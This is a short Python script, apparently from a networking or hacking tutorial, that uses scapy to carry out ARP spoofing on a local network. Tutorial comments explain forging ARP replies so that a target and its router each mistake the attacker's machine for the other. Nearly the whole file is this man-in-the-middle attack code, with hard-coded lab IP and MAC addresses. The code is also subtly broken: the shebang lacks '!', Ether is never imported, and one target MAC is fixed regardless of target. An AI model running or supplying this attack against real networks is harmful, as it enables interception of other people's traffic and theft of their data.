#/usr/bin/env python
# Rebuild
from scapy.layers.l2 import ARP
import scapy.all as scapy
from utils.arp_spoof_utils import check_port_forwarding

target_interface_1 = "192.168.63.174"
target_interface_2 = "192.168.63.177"
target_mac_1 = "00:0c:29:3a:62:c0"
router_ip = "192.168.63.2"
my_ip = "192.168.63.139"
my_mac = "00-0c-29-fe-37-29"

# get the Target IP MAC Address
def scan(ip):
	arp_request = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	broadcast_arp_request = broadcast/arp_request
	answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]

	clients_list = []
	for element in answered_list:
		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
		clients_list.append(client_dict)
	return clients_list

check_port_forwarding()

# So, previously we fooled the target into thinking we are the router.
# But we also need to fool the router into thinking we are the target
# We can build a function to do this:

def spoof(target_ip, spoof_ip):
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac_1, psrc=spoof_ip)
	scapy.send(packet)